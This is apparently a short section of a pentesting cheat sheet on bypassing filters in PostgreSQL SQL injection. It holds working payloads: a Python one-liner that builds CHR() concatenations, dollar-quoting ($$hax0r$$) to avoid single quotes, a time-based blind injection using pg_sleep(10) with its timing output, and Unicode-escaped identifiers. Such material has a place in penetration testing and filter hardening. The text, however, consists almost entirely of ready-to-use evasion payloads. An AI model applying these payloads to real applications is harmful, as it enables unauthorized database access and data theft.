# Bypass Techniques

### General

```sql
#ASCII concatenation
#1
a = "jordi"
print('||'.join("CHR("+str(ord(i))+")" for i in a))
#2
SELECT CHR(106)||CHR(111)||CHR(114)||CHR(100)||CHR(105)

#Single Quote Bypass using $$
$$hax0r$$ #Equals 'hax0r'
> AND $$hax0r$$ = $$hax0r$$ AND (SELECT 1 FROM pg_sleep(10))=1
0:00:10.491213

#Unicode
SELECT U&"\006a\006f\0072\0064\0069" #Equals SELECT jordi
```



